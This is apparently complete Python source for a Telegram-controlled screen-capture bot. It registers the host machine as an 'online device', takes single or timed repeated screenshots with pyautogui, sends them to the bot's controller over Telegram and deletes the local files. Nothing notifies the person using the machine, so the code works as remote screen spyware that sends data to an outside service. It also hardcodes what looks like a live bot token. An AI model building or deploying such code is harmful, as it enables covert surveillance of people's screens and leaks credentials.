import os
import time
import platform
import pyautogui
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# Global variables
devices = {}
selected_device = None
screenshot_frequency = 5
is_screenshotting = False

def register_device(device_id):
    system_name = platform.node()
    os_name = platform.system()
    devices[device_id] = {"name": system_name, "os": os_name, "online": True}

def start(update: Update, context: CallbackContext):
    device_list = "\n".join([f"{idx}. {info['name']} ({info['os']})"
                             for idx, info in devices.items()])
    update.message.reply_text(
        f"Commands:\n"
        "/start - Show this message\n"
        "/screenshot - Take a screenshot\n"
        "/setfrequency {seconds} - Set screenshot frequency\n"
        "/autoscreenshot {minutes} - Auto screenshot\n"
        "/stop - Stop auto screenshot\n"
        "/select {device_number} - Select a device\n"
        "/unselect - Unselect the device\n\n"
        f"Online Devices:\n{device_list or 'No devices online.'}"
    )

def select(update: Update, context: CallbackContext):
    global selected_device
    try:
        device_id = int(context.args[0])
        if device_id in devices:
            selected_device = device_id
            update.message.reply_text(f"Selected device {device_id}: {devices[device_id]['name']}")
        else:
            update.message.reply_text("Invalid device number.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /select {device_number}")

def screenshot(update: Update, context: CallbackContext):
    if not selected_device:
        update.message.reply_text("No device selected.")
        return
    screenshot = pyautogui.screenshot()
    screenshot_path = f"screenshot_{selected_device}.png"
    screenshot.save(screenshot_path)
    update.message.reply_photo(photo=open(screenshot_path, 'rb'))
    os.remove(screenshot_path)

def set_frequency(update: Update, context: CallbackContext):
    global screenshot_frequency
    try:
        screenshot_frequency = int(context.args[0])
        update.message.reply_text(f"Frequency set to {screenshot_frequency} seconds.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /setfrequency {seconds}")

def autoscreenshot(update: Update, context: CallbackContext):
    global is_screenshotting
    if not selected_device:
        update.message.reply_text("No device selected.")
        return
    if is_screenshotting:
        update.message.reply_text("Autoscreenshot already running.")
        return
    try:
        duration = int(context.args[0]) * 60
        is_screenshotting = True
        start_time = time.time()
        while time.time() - start_time < duration and is_screenshotting:
            screenshot(update, context)
            time.sleep(screenshot_frequency)
        is_screenshotting = False
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /autoscreenshot {minutes}")

def stop(update: Update, context: CallbackContext):
    global is_screenshotting
    is_screenshotting = False
    update.message.reply_text("Stopped autoscreenshot.")

def main():
    TOKEN = "7576774302:AAFtHrzsAOmI58FM9kMgravElfXbOznwYzA"
    register_device(1)
    updater = Updater(TOKEN)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("screenshot", screenshot))
    dp.add_handler(CommandHandler("setfrequency", set_frequency))
    dp.add_handler(CommandHandler("autoscreenshot", autoscreenshot))
    dp.add_handler(CommandHandler("stop", stop))
    dp.add_handler(CommandHandler("select", select))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
